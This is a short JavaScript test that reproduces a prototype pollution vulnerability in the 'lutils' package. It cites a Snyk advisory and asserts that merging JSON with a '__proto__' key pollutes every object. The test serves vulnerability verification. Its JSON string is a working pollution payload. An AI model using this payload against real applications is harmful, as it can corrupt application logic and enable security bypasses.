//https://security.snyk.io/vuln/SNYK-JS-LUTILS-1311023
test("prototype pollution in lutils", () => {
  const lt = require("lutils");
  let obj = {};
  expect({}.polluted).toBe(undefined);

  let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  lt.merge({}, EVIL_JSON);

  expect({}.polluted).toBe("yes");
});
